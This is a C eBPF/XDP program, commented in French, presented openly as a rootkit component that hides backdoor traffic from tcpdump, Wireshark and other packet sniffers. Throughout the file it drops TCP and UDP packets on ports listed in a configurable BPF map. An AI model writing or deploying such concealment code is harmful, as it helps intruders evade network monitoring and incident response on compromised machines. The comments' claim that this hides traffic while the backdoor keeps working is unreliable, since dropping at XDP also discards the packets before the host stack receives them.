/* SPDX-License-Identifier: GPL-2.0 */
/*
 * XDP packet hiding — rend le trafic backdoor invisible a tcpdump/wireshark.
 *
 * Ce programme XDP inspecte chaque paquet entrant. Si le port source ou
 * destination correspond a un port cache (configure via BPF map), le paquet
 * est silencieusement drop AVANT qu'il n'atteigne la couche capture (AF_PACKET).
 * Resultat : tcpdump, wireshark et tout sniffer ne voient jamais ces paquets.
 */
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>

#define ETH_P_IP   0x0800
#define IPPROTO_TCP 6
#define IPPROTO_UDP 17

/* Map contenant les ports a cacher : cle = port (host byte order), valeur = 1 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 16);
    __type(key, __u16);
    __type(value, __u8);
} hidden_ports SEC(".maps");

/* Map flag : 0 = filtre desactive, 1 = filtre actif */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u8);
} xdp_enabled SEC(".maps");

SEC("xdp")
int xdp_hide_packets(struct xdp_md *ctx)
{
    void *data     = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;

    /* Verifier si le filtre est actif */
    __u32 zero = 0;
    __u8 *enabled = bpf_map_lookup_elem(&xdp_enabled, &zero);
    if (!enabled || *enabled == 0)
        return XDP_PASS;

    /* Parse Ethernet */
    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end)
        return XDP_PASS;

    if (eth->h_proto != bpf_htons(ETH_P_IP))
        return XDP_PASS;

    /* Parse IP */
    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end)
        return XDP_PASS;

    __u16 sport = 0, dport = 0;

    if (ip->protocol == IPPROTO_TCP) {
        struct tcphdr *tcp = (void *)ip + (ip->ihl * 4);
        if ((void *)(tcp + 1) > data_end)
            return XDP_PASS;
        sport = bpf_ntohs(tcp->source);
        dport = bpf_ntohs(tcp->dest);
    } else if (ip->protocol == IPPROTO_UDP) {
        struct udphdr *udp = (void *)ip + (ip->ihl * 4);
        if ((void *)(udp + 1) > data_end)
            return XDP_PASS;
        sport = bpf_ntohs(udp->source);
        dport = bpf_ntohs(udp->dest);
    } else {
        return XDP_PASS;
    }

    /* Drop si source ou destination est un port cache */
    __u8 *val;
    val = bpf_map_lookup_elem(&hidden_ports, &sport);
    if (val)
        return XDP_DROP;

    val = bpf_map_lookup_elem(&hidden_ports, &dport);
    if (val)
        return XDP_DROP;

    return XDP_PASS;
}

char LICENSE[] SEC("license") = "GPL";
